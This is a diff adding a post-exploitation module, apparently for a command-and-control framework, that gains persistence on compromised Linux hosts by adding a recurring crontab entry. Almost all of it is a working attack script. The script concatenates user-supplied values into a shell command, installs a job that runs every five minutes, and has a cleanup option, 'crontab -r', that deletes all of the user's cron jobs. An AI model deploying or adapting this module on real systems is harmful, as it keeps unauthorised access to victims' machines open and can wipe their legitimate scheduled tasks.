@@ -1,0 +1,68 @@
+name: Persistence with crontab
+authors:
+  - name: ''
+    handle: '@Cx01N'
+    link: ''
+description: |
+  Establishes persistence by creating scheduled cron jobs that execute
+  specified commands at regular intervals. Adds new cron entries to
+  the user's crontab without affecting existing scheduled tasks.
+  Supports configurable scheduling using standard cron syntax and
+  includes functionality to remove all cron jobs for cleanup.
+  The module creates a temporary crontab file, appends the new job,
+  and installs the updated crontab. Useful for maintaining long-term
+  access to compromised systems, executing recurring reconnaissance
+  tasks, and establishing persistence that survives system reboots
+  and user sessions.
+software: ''
+tactics: []
+techniques:
+  - T1168
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '3.8'
+comments:
+  - ''
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: Command
+    description: Command to run as a cron job.
+    required: true
+    value: 'python3 /home/kali/test.py'
+  - name: CronSettings
+    description: Command to run as a cron job.
+    required: false
+    value: '*/5 * * * *'
+  - name: Remove
+    description: Remove the cron job.
+    required: false
+    value: 'False'
+    strict: true
+    suggested_values:
+      - True
+      - False
+script: |-
+  import subprocess
+
+  command = "{{Command}}"
+  cron_settings = "{{CronSettings}}"
+  delete = '{{Remove}}'
+
+  try:
+      if delete.lower() == 'true':
+          subprocess.call(['crontab', '-r'])
+          print("Cronjob removed")
+      else:
+          cmd = '(crontab -l > .tab ; echo "' + cron_settings + ' ' + command + '" >> .tab ; crontab .tab ; rm .tab)'
+          proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+          output = proc.stdout.readline()
+          print(output.rstrip())
+          print("Cronjob created")
+  except Exception as e:
+      print("[!] " + str(e))
